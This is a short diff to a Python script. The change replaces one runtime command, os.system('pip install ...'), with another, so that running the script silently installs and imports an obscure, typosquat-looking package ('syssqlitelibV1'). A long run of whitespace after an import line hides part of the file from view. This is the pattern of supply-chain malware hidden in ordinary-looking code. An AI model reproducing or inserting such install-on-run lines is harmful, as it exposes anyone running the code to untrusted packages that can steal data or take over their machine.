@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite2kits")
-import syssqlite2kits
+os.system("pip install syssqlitelibV1")
+import syssqlitelibV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
